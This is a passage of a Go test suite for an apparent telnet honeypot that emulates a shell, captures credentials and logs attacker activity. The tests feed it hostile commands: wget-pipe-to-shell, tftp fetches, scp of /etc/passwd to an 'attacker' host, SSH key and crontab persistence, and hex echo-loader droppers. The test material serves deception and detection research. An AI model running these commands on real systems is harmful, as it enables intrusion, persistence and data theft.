package telnet_test

import (
	"bytes"
	"encoding/base64"
	"net"
	"regexp"
	"strconv"
	"strings"
	"sync/atomic"
	"testing"
	"time"

	"sweetty/internal/fakehost"
	"sweetty/internal/persona"
	"sweetty/internal/proto/telnet"
	"sweetty/internal/testharness"
)

// setup brings up a telnet honeypot over the harness with a full-profile persona
// and its rendered virtual filesystem.
func setup(t *testing.T, style string) (*testharness.Harness, *persona.Persona) {
	t.Helper()
	p := persona.GenerateProfile("full")
	fs, err := fakehost.Load(p)
	if err != nil {
		t.Fatal(err)
	}
	h, err := testharness.New(telnet.New(fs, p, style))
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(h.Close)
	return h, p
}

// login authenticates with the persona's real per-instance credential (the telnet
// service validates like sshd, so a wrong password is rejected) and leaves the
// session at a shell prompt. Pass "root" or the persona's primary user.
func login(t *testing.T, h *testharness.Harness, p *persona.Persona, user string) {
	t.Helper()
	pass := p.RootPassword
	if user == p.Username {
		pass = p.UserPassword
	}
	if _, ok := h.ReadUntil("login:", 2*time.Second); !ok {
		t.Fatal("never saw login prompt")
	}
	h.SendLine(user)
	if _, ok := h.ReadUntil("Password:", 2*time.Second); !ok {
		t.Fatal("never saw password prompt")
	}
	h.SendLine(pass)
	h.ReadFor(600 * time.Millisecond) // drain welcome + first prompt
}

// run sends a command line and returns what the shell wrote back.
func run(h *testharness.Harness, cmd string) string {
	h.SendLine(cmd)
	return h.ReadFor(700 * time.Millisecond)
}

func TestIACNegotiationOnConnect(t *testing.T) {
	h, p := setup(t, "ubuntu")
	out := h.ReadFor(400 * time.Millisecond)
	// Real telnetd opens with a burst, not a lone DO NAWS. Assert the burst carries
	// DO NAWS and terminal-query DOs (TTYPE, NEW-ENVIRON), and that the opening
	// contains several IAC option triplets, codifying "a burst, not one option"
	// without pinning the exact build-dependent set. It deliberately does NOT offer
	// SGA: SGA without ECHO would put a client in kludge line mode (a stray ^M at the
	// prompt), so the server stays in plain line mode.
	for _, want := range []struct {
		name  string
		bytes string
	}{
		{"DO NAWS", "\xff\xfd\x1f"},
		{"DO NEW-ENVIRON", "\xff\xfd\x27"},
		{"DO TTYPE", "\xff\xfd\x18"},
	} {
		if !strings.Contains(out, want.bytes) {
			t.Fatalf("opening negotiation missing %s (% x); got % x", want.name, want.bytes, out)
		}
	}
	if n := strings.Count(out, "\xff"); n < 4 {
		t.Fatalf("opening negotiation is not a burst: only %d IAC bytes; got % x", n, out)
	}
	// The burst must NOT offer WILL SGA: SGA without ECHO is the kludge-line-mode
	// trigger that echoes a stray ^M at the login prompt on a real client.
	if strings.Contains(out, "\xff\xfb\x03") {
		t.Fatalf("opening offers WILL SGA, which drops a client into kludge line mode; got % x", out)
	}
	// agetty prints "<hostname> login: ", not a bare "login: ".
	if !strings.Contains(out, p.Hostname+" login: ") {
		t.Fatalf("login prompt does not carry the hostname like agetty; got %q", out)
	}
}

// A wrong credential is captured verbatim and marked rejected — the box validates
// like sshd, but every attempt is still recorded for intelligence.
func TestCredentialCapture(t *testing.T) {
	h, _ := setup(t, "ubuntu")
	if _, ok := h.ReadUntil("login:", 2*time.Second); !ok {
		t.Fatal("never saw login prompt")
	}
	h.SendLine("root")
	h.ReadUntil("Password:", 2*time.Second)
	h.SendLine("hunter2")
	h.ReadFor(400 * time.Millisecond)
	e, ok := h.FindEvent("CREDENTIAL")
	if !ok {
		t.Fatal("no CREDENTIAL event captured")
	}
	if e.Username != "root" || e.Password != "hunter2" {
		t.Fatalf("captured creds = %q / %q", e.Username, e.Password)
	}
	if e.Note != "rejected" {
		t.Fatalf("a wrong password must be marked rejected, got %q", e.Note)
	}
}

// TestCRNulEnterSubmitsLogin reproduces an interactive telnet client (macOS/BSD
// telnet sends CR NUL for Enter, not CR LF): the username must submit and the
// password prompt appear, rather than the login prompt swallowing carriage returns.
func TestCRNulEnterSubmitsLogin(t *testing.T) {
	h, _ := setup(t, "ubuntu")
	if _, ok := h.ReadUntil("login:", 2*time.Second); !ok {
		t.Fatal("never saw login prompt")
	}
	h.SendBytes([]byte("admin\r\x00"))
	if _, ok := h.ReadUntil("Password:", 2*time.Second); !ok {
		t.Fatal("CR NUL Enter did not submit the username")
	}
	h.SendBytes([]byte("pw\r\x00"))
	h.ReadFor(400 * time.Millisecond)
	e, ok := h.FindEvent("CREDENTIAL")
	if !ok {
		t.Fatal("no CREDENTIAL event")
	}
	if e.Username != "admin" {
		t.Fatalf("username = %q, want admin", e.Username)
	}
}

func TestInboundIACStrippedFromUsername(t *testing.T) {
	h, _ := setup(t, "ubuntu")
	h.ReadUntil("login:", 2*time.Second)
	// A real client's option negotiation (IAC WILL NAWS = FF FB 1F) must not end
	// up inside the captured username.
	h.SendBytes([]byte{0xff, 0xfb, 0x1f})
	h.SendLine("admin")
	h.ReadUntil("Password:", 2*time.Second)
	h.SendLine("pw")
	h.ReadFor(400 * time.Millisecond)
	e, ok := h.FindEvent("CREDENTIAL")
	if !ok {
		t.Fatal("no CREDENTIAL event")
	}
	if e.Username != "admin" {
		t.Fatalf("username not cleaned of IAC bytes: %q", e.Username)
	}
}

func TestIdentityComesFromPersona(t *testing.T) {
	h, p := setup(t, "ubuntu")
	login(t, h, p, "root")
	if out := run(h, "hostname"); !strings.Contains(out, p.Hostname) {
		t.Fatalf("hostname not from persona %q: %q", p.Hostname, out)
	}
	if out := run(h, "uname -a"); !strings.Contains(out, p.KernelRel) || !strings.Contains(out, p.Hostname) {
		t.Fatalf("uname -a not coherent with persona: %q", out)
	}
	if out := run(h, "whoami"); !strings.Contains(out, "root") {
		t.Fatalf("whoami: %q", out)
	}
}

func TestFilesystemCoherence(t *testing.T) {
	h, p := setup(t, "ubuntu")
	login(t, h, p, "root")
	// ls names /etc/passwd and cat reads the same coherent content.
	if out := run(h, "ls /etc"); !strings.Contains(out, "passwd") {
		t.Fatalf("ls /etc missing passwd: %q", out)
	}
	if out := run(h, "cat /etc/passwd"); !strings.Contains(out, "root:x:0:0") {
		t.Fatalf("cat /etc/passwd: %q", out)
	}
	// A root shell can read shadow (refusing root would be a tell).
	if out := run(h, "cat /etc/shadow"); !strings.Contains(out, "root:$6$") {
		t.Fatalf("root cannot read shadow: %q", out)
	}
	// Missing file errors coherently.
	if out := run(h, "cat /etc/nope"); !strings.Contains(out, "No such file or directory") {
		t.Fatalf("missing file error: %q", out)
	}
}

func TestStatefulCdAndPwd(t *testing.T) {
	h, p := setup(t, "ubuntu")
	login(t, h, p, "root")
	run(h, "cd /tmp")
	if out := run(h, "pwd"); !strings.Contains(out, "/tmp") {
		t.Fatalf("cd did not change cwd: %q", out)
	}
	if out := run(h, "cd /does/not/exist"); !strings.Contains(out, "No such file or directory") {
		t.Fatalf("cd to missing dir: %q", out)
	}
}

func TestOverlayMutationVisible(t *testing.T) {
	h, p := setup(t, "ubuntu")
	login(t, h, p, "root")
	run(h, "touch /tmp/payload.sh")
	if out := run(h, "ls /tmp"); !strings.Contains(out, "payload.sh") {
		t.Fatalf("overlay file not visible after touch: %q", out)
	}
	run(h, "echo hello > /tmp/note.txt")
	if out := run(h, "cat /tmp/note.txt"); !strings.Contains(out, "hello") {
		t.Fatalf("redirect-to-file not readable: %q", out)
	}
}

// TestEcholoaderReconstructsDropper proves the BusyBox echo-loader path works end
// to end: echo -e decodes \xHH, and `>>` appends, so a dropper assembled one chunk
// at a time accumulates the real reconstructed content rather than literal "\x.."
// text or only the last chunk written.
func TestEcholoaderReconstructsDropper(t *testing.T) {
	h, p := setup(t, "ubuntu")
	login(t, h, p, "root")

	// echo -ne decodes the hex into the file.
	run(h, `echo -ne '\x50\x6f\x72\x74' > /tmp/p`)
	if out := run(h, "cat /tmp/p"); !strings.Contains(out, "Port") {
		t.Fatalf("echo -ne did not decode hex into the file: %q", out)
	}

	// `>>` accumulates chunks rather than overwriting.
	run(h, `echo -ne '\x48\x69' >> /tmp/d`)
	run(h, `echo -ne '\x21' >> /tmp/d`)
	if out := run(h, "cat /tmp/d"); !strings.Contains(out, "Hi!") {
		t.Fatalf("`>>` did not accumulate the appended chunks: %q", out)
	}
}

// TestDropperContentCaptured proves a file an attacker assembles on the box and
// then runs is captured as a DROPPER indicator carrying its reconstructed content
// and a sha256, the real payload when nothing was fetched over the wire.
func TestDropperContentCaptured(t *testing.T) {
	h, p := setup(t, "ubuntu")
	login(t, h, p, "root")
	// Assemble "#!/bin/sh\nexit" byte by byte with the echo-loader, then run it.
	run(h, `echo -ne '\x23\x21\x2f\x62\x69\x6e\x2f\x73\x68\x0a\x65\x78\x69\x74' > /tmp/.x`)
	run(h, "sh /tmp/.x")

	e, ok := h.FindEvent("DROPPER")
	if !ok {
		t.Fatal("running an assembled file did not produce a DROPPER event")
	}
	if !strings.Contains(e.Data, "#!/bin/sh") {
		t.Errorf("dropper content was not reconstructed: %q", e.Data)
	}
	if len(e.SHA256) != 64 {
		t.Errorf("dropper sha256 missing or malformed: %q", e.SHA256)
	}
}

// TestTftpAndFtpgetLogDownloads proves the BusyBox fetch fallbacks are captured:
// tftp and ftpget log a download attempt with the staging host rather than falling
// through to "terminated", so a loader that avoids wget/curl still surfaces its IOC.
func TestTftpAndFtpgetLogDownloads(t *testing.T) {
	h, p := setup(t, "ubuntu")
	login(t, h, p, "root")
	run(h, "tftp -g -r mips.bin 198.51.100.5")
	run(h, "ftpget 203.0.113.9 m.bin m.bin")

	var hosts []string
	for _, e := range h.Entries() {
		if e.Event == "DOWNLOAD_ATTEMPT" {
			hosts = append(hosts, e.Host)
		}
	}
	joined := strings.Join(hosts, " ")
	if !strings.Contains(joined, "198.51.100.5") || !strings.Contains(joined, "203.0.113.9") {
		t.Errorf("tftp/ftpget did not log the fetch hosts: %v", hosts)
	}
}

// TestPersistenceCommandsReportSuccess proves the account/persistence commands a
// loader runs after break-in report a believable silent success instead of
// "command not found", which would tell the loader it is not on a real shell.
func TestPersistenceCommandsReportSuccess(t *testing.T) {
	h, p := setup(t, "ubuntu")
	login(t, h, p, "root")
	for _, cmd := range []string{"chpasswd", "useradd backup", "usermod -aG sudo backup"} {
		if out := run(h, cmd); strings.Contains(out, "not found") {
			t.Errorf("%q reported command not found: %q", cmd, out)
		}
	}
}

// TestSuCapturesPassword proves su prompts for and captures a password, the way
// Hajime-class loaders use it, rather than failing as an unknown command.
func TestSuCapturesPassword(t *testing.T) {
	h, p := setup(t, "ubuntu")
	login(t, h, p, "root")
	h.SendLine("su")
	if _, ok := h.ReadUntil("Password:", time.Second); !ok {
		t.Fatal("su did not prompt for a password")
	}
	h.SendLine("zyad5001")
	h.ReadFor(400 * time.Millisecond)

	var found bool
	for _, e := range h.Entries() {
		if e.Event == "CREDENTIAL" && e.Password == "zyad5001" {
			found = true
		}
	}
	if !found {
		t.Error("su did not capture the offered password as a credential")
	}
}

func TestParsingShapes(t *testing.T) {
	h, p := setup(t, "ubuntu")
	login(t, h, p, "root")
	// Leading env assignment must not become "command not found".
	if out := run(h, "HISTFILE=/dev/null whoami"); !strings.Contains(out, "root") || strings.Contains(out, "not found") {
		t.Fatalf("env-assignment prefix broke: %q", out)
	}
	// A pipe filters.
	if out := run(h, "cat /etc/passwd | grep root"); !strings.Contains(out, "root:x:0:0") {
		t.Fatalf("pipe to grep: %q", out)
	}
	// stderr redirect is swallowed without breaking the command.
	if out := run(h, "cat /etc/hostname 2>/dev/null"); strings.Contains(out, "not found") {
		t.Fatalf("2>/dev/null broke the command: %q", out)
	}
	if out := run(h, "echo $USER"); !strings.Contains(out, "root") {
		t.Fatalf("var expansion: %q", out)
	}
}

func TestUnknownCommand(t *testing.T) {
	h, p := setup(t, "ubuntu")
	login(t, h, p, "root")
	if out := run(h, "definitelynotacommand"); !strings.Contains(out, "not found") {
		t.Fatalf("unknown command: %q", out)
	}
}

func TestDownloadFetchesNothing(t *testing.T) {
	h, p := setup(t, "ubuntu")
	login(t, h, p, "root")
	run(h, "wget http://203.0.113.9/x.sh")
	e, ok := h.FindEvent("DOWNLOAD_ATTEMPT")
	if !ok {
		t.Fatal("wget did not log a DOWNLOAD_ATTEMPT")
	}
	if !strings.Contains(e.URL, "203.0.113.9") {
		t.Fatalf("download url not captured: %q", e.URL)
	}
}

// TestNoOutboundConnectionOrExec is the behavioural twin of the structural
// guardrail: it points every download/exec vector at a local listener that flags
// any connection, and proves the intent is logged while nothing actually
// connects or runs. This is the SSRF/exec boundary the whole design rests on.
func TestNoOutboundConnectionOrExec(t *testing.T) {
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	defer ln.Close()
	var accepted int32
	go func() {
		for {
			c, err := ln.Accept()
			if err != nil {
				return
			}
			atomic.StoreInt32(&accepted, 1)
			c.Close()
		}
	}()
	url := "http://" + ln.Addr().String() + "/x.sh"

	h, p := setup(t, "ubuntu")
	login(t, h, p, "root")
	run(h, "wget "+url)
	run(h, "curl -O "+url)
	run(h, "sh -c 'wget "+url+"'")
	run(h, "python3 -c \"import urllib.request; urllib.request.urlopen('"+url+"')\"")
	blob := base64.StdEncoding.EncodeToString([]byte("wget " + url + " | sh"))
	run(h, "echo "+blob+" | base64 -d")
	time.Sleep(250 * time.Millisecond) // give any (buggy) real fetch time to land

	if !h.HasEvent("DOWNLOAD_ATTEMPT") {
		t.Error("download intent was not captured")
	}
	if !h.HasEvent("EXEC_ATTEMPT") {
		t.Error("execution intent was not captured")
	}
	if atomic.LoadInt32(&accepted) != 0 {
		t.Fatal("the honeypot opened a real outbound connection: the SSRF boundary is breached")
	}
}

func TestPipeToShellIsExecAttempt(t *testing.T) {
	h, p := setup(t, "ubuntu")
	login(t, h, p, "root")
	run(h, "wget -O- http://203.0.113.9/x.sh | sh")
	if !h.HasEvent("EXEC_ATTEMPT") {
		t.Fatal("pipe-to-shell did not log an EXEC_ATTEMPT")
	}
}

func TestExitEndsSession(t *testing.T) {
	h, p := setup(t, "ubuntu")
	login(t, h, p, "root")
	run(h, "exit")
	if !h.HasEvent("SESSION_END") {
		t.Fatal("exit did not end the session")
	}
}

// TestDownloadLandsAndRuns proves the "it's working" download chain: wget
// completes and the file lands in the overlay (no real fetch, no outbound
// connection — covered by TestNoOutboundConnectionOrExec), and running the dropped
// file is captured as an exec rather than failing as missing.
func TestDownloadLandsAndRuns(t *testing.T) {
	h, p := setup(t, "ubuntu")
	login(t, h, p, "root")
	run(h, "cd /tmp")
	out := run(h, "wget http://203.0.113.9/stage.sh")
	if strings.Contains(out, "Connection reset") || !strings.Contains(out, "saved") {
		t.Fatalf("wget did not complete and save: %q", out)
	}
	if ls := run(h, "ls /tmp"); !strings.Contains(ls, "stage.sh") {
		t.Fatalf("downloaded file did not land in the overlay: %q", ls)
	}
	run(h, "chmod +x stage.sh")
	run(h, "./stage.sh")
	if !h.HasEvent("EXEC_ATTEMPT") {
		t.Fatal("running the dropped file did not log an EXEC_ATTEMPT")
	}
	if again := run(h, "./stage.sh"); strings.Contains(again, "No such file") || strings.Contains(again, "not found") {
		t.Fatalf("dropped file is not runnable: %q", again)
	}
}

// TestInstallsComplete proves apt and pip appear to work: the install finishes
// (no "are you root" / permission denied) and leaves a stub on PATH.
func TestInstallsComplete(t *testing.T) {
	h, p := setup(t, "ubuntu")
	login(t, h, p, "root")
	out := run(h, "apt-get install -y nmap")
	if strings.Contains(out, "Permission denied") || strings.Contains(out, "are you root") {
		t.Fatalf("apt install failed instead of completing: %q", out)
	}
	if !strings.Contains(out, "Setting up nmap") {
		t.Fatalf("apt install did not set up the package: %q", out)
	}
	if w := run(h, "which nmap"); !strings.Contains(w, "nmap") {
		t.Fatalf("installed package left no stub on PATH: %q", w)
	}
	if pi := run(h, "pip3 install requests"); !strings.Contains(pi, "Successfully installed") {
		t.Fatalf("pip install did not complete: %q", pi)
	}
}

// TestPersistenceSticks proves edits and persistence "take": a crontab installed
// via -e is echoed back by -l, and an authorized_keys append survives a re-read.
func TestPersistenceSticks(t *testing.T) {
	h, p := setup(t, "ubuntu")
	login(t, h, p, "root")

	h.SendLine("crontab -e")
	h.ReadFor(300 * time.Millisecond)
	h.SendLine("* * * * * /tmp/.x >/dev/null 2>&1")
	h.SendLine(":wq")
	h.ReadFor(300 * time.Millisecond)
	if out := run(h, "crontab -l"); !strings.Contains(out, "/tmp/.x") {
		t.Fatalf("crontab did not persist the installed entry: %q", out)
	}

	run(h, "mkdir -p /root/.ssh")
	run(h, "echo ssh-ed25519 AAAAC3Nz attacker@evil >> /root/.ssh/authorized_keys")
	if out := run(h, "cat /root/.ssh/authorized_keys"); !strings.Contains(out, "attacker@evil") {
		t.Fatalf("authorized_keys append did not stick: %q", out)
	}
}

// TestExfilCompletes proves outbound copies appear to succeed (capturing the
// destination and credential as exfil) while — like every network vector here —
// never opening a real connection.
func TestExfilCompletes(t *testing.T) {
	h, p := setup(t, "ubuntu")
	login(t, h, p, "root")

	h.SendLine("scp /etc/passwd attacker@203.0.113.50:/loot/")
	if _, ok := h.ReadUntil("password:", 3*time.Second); !ok {
		t.Fatal("scp did not prompt for a password")
	}
	h.SendLine("hunter2")
	out := h.ReadFor(900 * time.Millisecond)
	if strings.Contains(out, "timed out") || !strings.Contains(out, "100%") {
		t.Fatalf("scp did not complete the transfer: %q", out)
	}
	var gotExfil, gotCred bool
	for _, e := range h.Entries() {
		if e.Note == "exfil" {
			gotExfil = true
		}
		if e.Event == "CREDENTIAL" && e.Password == "hunter2" {
			gotCred = true
		}
	}
	if !gotExfil {
		t.Fatal("scp exfil destination was not captured")
	}
	if !gotCred {
		t.Fatal("scp destination credential was not captured")
	}

	h.SendLine("rsync -avz /etc attacker@203.0.113.50:/loot/")
	if _, ok := h.ReadUntil("password:", 3*time.Second); ok {
		h.SendLine("hunter2")
	}
	if rout := h.ReadFor(900 * time.Millisecond); !strings.Contains(rout, "total size") {
		t.Fatalf("rsync did not complete: %q", rout)
	}
}

// TestPivotToJustinTimberlakeHost is the lateral-movement payoff: sshing to the
// internal backup host lands on a second fake machine, and the trail there leads
// to a stash of compelling, exfil-worthy files. No spoiler is visible up front:
// the open share is clean and nothing names the gag — the loot lives at an
// obscure, per-instance path the shell history points to. The pivot credential is
// captured.
func TestPivotToJustinTimberlakeHost(t *testing.T) {
	h, p := setup(t, "ubuntu")
	login(t, h, p, "root")

	h.SendLine("ssh deploy@" + p.BackupIP)
	if _, ok := h.ReadUntil("(yes/no", 3*time.Second); !ok {
		t.Fatal("no host-key authenticity prompt for the pivot")
	}
	h.SendLine("yes")
	if _, ok := h.ReadUntil("password", 3*time.Second); !ok {
		t.Fatal("no password prompt on the pivot host")
	}
	h.SendLine("Summer2026!")
	h.ReadFor(700 * time.Millisecond)

	// The pivot credential was captured.
	creds := 0
	for _, e := range h.Entries() {
		if e.Event == "CREDENTIAL" && e.Password == "Summer2026!" {
			creds++
		}
	}
	if creds == 0 {
		t.Fatal("pivot password was not captured")
	}

	// No spoilers up front: the open share holds no bait and no giveaway readme, so
	// finding the stash takes following the trail rather than one ls.
	open := run(h, "ls -la /srv/backups")
	if strings.Contains(open, "wallet_seed_phrase") || strings.Contains(strings.ToLower(open), "readme") {
		t.Fatalf("open share leaks the stash or a giveaway: %q", open)
	}

	// Root's shell history is the breadcrumb: it names the obscure, per-instance loot
	// path the private set was moved to, and never mentions the gag.
	hist := run(h, "cat /root/.bash_history")
	if !strings.Contains(hist, p.LootPath) {
		t.Fatalf("history breadcrumb does not point at the loot path %q: %q", p.LootPath, hist)
	}
	for _, spoiler := range []string{"timberlake", "pictures/jt", "/jt/"} {
		if strings.Contains(strings.ToLower(hist), spoiler) {
			t.Fatalf("history contains a spoiler %q: %q", spoiler, hist)
		}
	}

	// Following the trail to the loot path lists the baited files, which report as
	// images.
	listing := run(h, "ls -la "+p.LootPath)
	if !strings.Contains(listing, "wallet_seed_phrase.png") {
		t.Fatalf("loot path missing the baited files: %q", listing)
	}
	if out := run(h, "file "+p.LootPath+"/wallet_seed_phrase.png"); !strings.Contains(strings.ToLower(out), "image") {
		t.Fatalf("baited file does not report as an image: %q", out)
	}
}

// TestBaitImageRevealsTheGag proves the payoff: however an attacker grabs a bait
// image, they get the colour-ANSI reveal, not a real secret. cat dumps it to the
// terminal; base64 carries it off the box; both are captured as honeytoken hits.
// TestCommandSubstitution checks $(...) and backticks run an inner command and
// splice its stdout, including the loader idiom ls -lh $(which ls) (which must not
// split on the inner space) and var=$(cmd) capture.
func TestCommandSubstitution(t *testing.T) {
	h, p := setup(t, "ubuntu")
	login(t, h, p, "root")

	if out := run(h, `echo "OS:$(uname -s)"`); !strings.Contains(out, "OS:Linux") {
		t.Errorf("$(uname -s) not substituted: %.120q", out)
	}
	run(h, `X=$(echo hello)`)
	if out := run(h, `echo got=$X`); !strings.Contains(out, "got=hello") {
		t.Errorf("var=$(...) did not capture: %.120q", out)
	}
	if out := run(h, `echo LS=$(which ls)`); !strings.Contains(out, "LS=/") {
		t.Errorf("$(which ls) split on the space or did not resolve: %.120q", out)
	}
	if out := run(h, "echo bt=`uname -m`"); !strings.Contains(out, "bt=") || strings.Contains(out, "`") {
		t.Errorf("backtick substitution failed: %.120q", out)
	}
}

// TestBracketTestBuiltin checks the [ / test builtin powers the loader fallback
// idiom `[ -f X ] && cmd` (and its `|| else` form).
func TestBracketTestBuiltin(t *testing.T) {
	h, p := setup(t, "ubuntu")
	login(t, h, p, "root")

	if out := run(h, `[ -f /proc/version ] && echo HASVER`); !strings.Contains(out, "HASVER") {
		t.Errorf("[ -f /proc/version ] should be true: %.120q", out)
	}
	if out := run(h, `[ -f /no/such/file ] && echo YES || echo MISSING`); !strings.Contains(out, "MISSING") {
		t.Errorf("[ -f missing ] && .. || .. wrong: %.120q", out)
	}
	if out := run(h, `[ -d /etc ] && echo ISDIR`); !strings.Contains(out, "ISDIR") {
		t.Errorf("[ -d /etc ] should be true: %.120q", out)
	}
	if out := run(h, `test aarch64 = aarch64 && echo MATCH`); !strings.Contains(out, "MATCH") {
		t.Errorf("test string equality failed: %.120q", out)
	}
}

// TestSubshellsGroupsNewlines checks ( ) subshells and { } groups run inline and
// compose with $(), and that a newline separates statements (multi-line scripts).
func TestSubshellsGroupsNewlines(t *testing.T) {
	h, p := setup(t, "ubuntu")
	login(t, h, p, "root")

	if out := run(h, `( echo a; echo b )`); !strings.Contains(out, "a") || !strings.Contains(out, "b") {
		t.Errorf("subshell () did not run inline: %.120q", out)
	}
	if out := run(h, `{ echo x; echo y; }`); !strings.Contains(out, "x") || !strings.Contains(out, "y") {
		t.Errorf("group {} did not run inline: %.120q", out)
	}
	run(h, `M=$( { echo m1; echo m2; } )`)
	if out := run(h, `echo CPU=$M`); !strings.Contains(out, "CPU=m1 m2") {
		t.Errorf("group inside $() not captured: %.120q", out)
	}
	// (newline-as-statement-separator is covered at the parser level in parse_test.go)
}

// TestBusyboxAndPathResolution checks the BusyBox multicall (run an applet, the
// Mirai applet-not-found presence probe, the banner) and that absolute /bin paths
// resolve to their command.
func TestBusyboxAndPathResolution(t *testing.T) {
	h, p := setup(t, "ubuntu")
	login(t, h, p, "root")

	if out := run(h, `busybox uname -m`); !strings.Contains(out, p.Arch) {
		t.Errorf("busybox uname -m did not run the applet: %.120q", out)
	}
	if out := run(h, `busybox ECHODONE`); !strings.Contains(out, "ECHODONE: applet not found") {
		t.Errorf("busybox <unknown> should be 'applet not found': %.120q", out)
	}
	if out := run(h, `/bin/busybox`); !strings.Contains(out, "BusyBox v"+p.BusyBoxVer) {
		t.Errorf("/bin/busybox banner missing version: %.120q", out)
	}
	if out := run(h, `/bin/uname -m`); !strings.Contains(out, p.Arch) {
		t.Errorf("/bin/uname -m did not resolve: %.120q", out)
	}
}

// TestUnameNprocUptime checks multi-flag uname emits all requested fields, nproc
// returns a core count, and /proc/uptime exists, so the loader fingerprint's
// UNAME/CPUS/UPTIME lines come back populated.
func TestUnameNprocUptime(t *testing.T) {
	h, p := setup(t, "ubuntu")
	login(t, h, p, "root")

	if out := run(h, `uname -s -v -n -m`); !strings.Contains(out, "Linux") || !strings.Contains(out, p.Hostname) || !strings.Contains(out, p.Arch) {
		t.Errorf("uname -s -v -n -m incomplete: %.120q", out)
	}
	if out := run(h, `nproc`); strings.Contains(out, "not found") || !strings.ContainsAny(out, "123456789") {
		t.Errorf("nproc should return a core count: %.120q", out)
	}
	if out := run(h, `cat /proc/uptime`); strings.Contains(out, "No such file") || !strings.Contains(out, ".") {
		t.Errorf("/proc/uptime missing: %.120q", out)
	}
}

func TestBaitImageRevealsTheGag(t *testing.T) {
	h, p := setup(t, "ubuntu")
	login(t, h, p, "root")
	h.SendLine("ssh deploy@" + p.BackupIP)
	h.ReadUntil("(yes/no", 3*time.Second)
	h.SendLine("yes")
	h.ReadUntil("password", 3*time.Second)
	h.SendLine("pw")
	h.ReadFor(600 * time.Millisecond)

	bait := p.LootPath + "/wallet_seed_phrase.png"

	// cat dumps the reveal straight to the terminal: colour-ANSI escapes, not raw
	// image bytes.
	if out := run(h, "cat "+bait); !strings.Contains(out, "\x1b[") {
		t.Fatalf("cat of bait did not render the colour-ANSI reveal: %.120q", out)
	}

	// base64 is the exfil channel: it now hands over a real JPEG of Justin
	// Timberlake (the wallet/seed bait gets the full-length shot), so an attacker
	// who copies the blob and decodes it locally opens a picture of JT rather than
	// any real secret. Align to a 4-byte boundary so a partly-drained stream still
	// decodes; the JPEG magic is in the first bytes, so a partial read still proves it.
	h.SendLine("base64 " + bait)
	b64 := longestB64Line(h.ReadFor(2 * time.Second))
	b64 = b64[:len(b64)/4*4]
	raw, err := base64.StdEncoding.DecodeString(b64)
	if err != nil || len(raw) < 16 {
		t.Fatalf("base64 of bait did not decode: %v (len %d)", err, len(raw))
	}
	if !bytes.HasPrefix(raw, []byte("\xff\xd8\xff")) {
		t.Fatalf("base64 of bait should decode to a real JPEG (the JT photo), got: % x", raw[:min(16, len(raw))])
	}

	// Both grabs were captured as honeytoken hits.
	hits := 0
	for _, e := range h.Entries() {
		if e.Event == "HONEYTOKEN" && strings.HasPrefix(e.Note, "loot-") {
			hits++
		}
	}
	if hits < 2 {
		t.Fatalf("expected cat and base64 grabs to log honeytoken hits, got %d", hits)
	}
}

// TestHoneytokenVaultIsTracked proves a fake-vault run is captured as a distinct
// HONEYTOKEN event, correlated to the session and source, so analytics can count
// who triggered the bait.
func TestHoneytokenVaultIsTracked(t *testing.T) {
	h, p := setup(t, "ubuntu")
	login(t, h, p, "root")
	run(h, "vault")
	e, ok := h.WaitEvent("HONEYTOKEN", 3*time.Second)
	if !ok {
		t.Fatal("running the fake vault did not log a HONEYTOKEN event")
	}
	if e.Session == "" {
		t.Fatal("honeytoken event is not correlated to a session")
	}
	if !strings.Contains(e.Command, "vault") {
		t.Fatalf("honeytoken command not captured: %q", e.Command)
	}
}

func longestB64Line(s string) string {
	best := ""
	for line := range strings.SplitSeq(s, "\n") {
		line = strings.TrimSpace(strings.TrimRight(line, "\r"))
		if len(line) > len(best) && isBase64(line) {
			best = line
		}
	}
	return best
}

func isBase64(s string) bool {
	if len(s) < 16 {
		return false
	}
	for _, c := range s {
		if !(c >= 'A' && c <= 'Z' || c >= 'a' && c <= 'z' || c >= '0' && c <= '9' || c == '+' || c == '/' || c == '=') {
			return false
		}
	}
	return true
}

// TestCrossSourceIdentityCoherence proves the host tells one story no matter
// which tool an attacker uses to read it. The /proc and /etc files are static
// literals baked into the image, while free/lscpu/uname are computed from the
// persona, so this is exactly where a careless seam between the two would show:
// a kernel, distro, memory size, or CPU that disagrees with itself.
func TestCrossSourceIdentityCoherence(t *testing.T) {
	h, p := setup(t, "ubuntu")
	login(t, h, p, "root")

	// uname -r (dynamic) names the same kernel release that /proc/version (static)
	// reports.
	kernel := regexp.MustCompile(`[0-9]+\.[0-9]+\.[0-9]+-[0-9]+-[a-z0-9]+`).FindString(run(h, "uname -r"))
	if kernel == "" {
		t.Fatal("could not read a kernel release from uname -r")
	}
	if ver := run(h, "cat /proc/version"); !strings.Contains(ver, kernel) {
		t.Fatalf("/proc/version kernel disagrees with uname -r %q: %q", kernel, ver)
	}

	// PRETTY_NAME in /etc/os-release matches the persona's distro string.
	osr := run(h, "cat /etc/os-release")
	m := regexp.MustCompile(`PRETTY_NAME="([^"]+)"`).FindStringSubmatch(osr)
	if m == nil {
		t.Fatalf("no PRETTY_NAME in /etc/os-release: %q", osr)
	}
	if m[1] != p.PrettyName {
		t.Fatalf("os-release PRETTY_NAME %q != persona %q", m[1], p.PrettyName)
	}

	// MemTotal in /proc/meminfo equals the Mem total reported by free.
	memTotal, ok := firstInt(firstLineWith(run(h, "cat /proc/meminfo"), "MemTotal"))
	if !ok {
		t.Fatal("could not parse MemTotal from /proc/meminfo")
	}
	freeTotal, ok := firstInt(firstLineWith(run(h, "free"), "Mem:"))
	if !ok {
		t.Fatal("could not parse the Mem total from free")
	}
	if memTotal != freeTotal {
		t.Fatalf("memory size disagrees: meminfo=%d free=%d", memTotal, freeTotal)
	}

	// The CPU model in /proc/cpuinfo appears verbatim in lscpu.
	model := valueAfterColon(run(h, "cat /proc/cpuinfo"), "model name")
	if model == "" {
		t.Fatal("no model name in /proc/cpuinfo")
	}
	if cpu := run(h, "lscpu"); !strings.Contains(cpu, model) {
		t.Fatalf("lscpu CPU model disagrees with /proc/cpuinfo %q: %q", model, cpu)
	}
}

// TestMetadataViewsAgree proves the three common ways to ask "how big is this
// file and who owns it" all return the same answer for /etc/passwd: ls -l, stat,
// and wc -c must agree on the size, and ls and stat must agree on the owner.
func TestMetadataViewsAgree(t *testing.T) {
	h, p := setup(t, "ubuntu")
	login(t, h, p, "root")

	// ls -l: trailing fields are size month day time name, so the size sits five
	// fields from the end regardless of the left-hand padding.
	lsFields := strings.Fields(firstLineWith(run(h, "ls -l /etc/passwd"), "passwd"))
	if len(lsFields) < 9 {
